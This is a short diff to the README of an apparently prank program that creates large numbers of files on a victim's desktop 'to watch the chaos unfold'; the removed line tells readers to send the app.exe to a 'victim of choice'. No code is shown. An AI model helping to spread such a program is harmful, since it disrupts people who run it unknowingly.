@@ -4,7 +4,7 @@
 instead of creating the files in their user folder, it creates them on the desktop so they can watch the chaos unfold
 
 ## Installation
-for those of you that are stupid just go into the *regular* or *desktop* folders in the repo and grab the app.exe file and send it to the victim of choice
+for those of you that are stupid just click release on the right of ur screen and download either *regular* or *desktop*
 
 or if you want the whole repo just clone it by typing
 ```
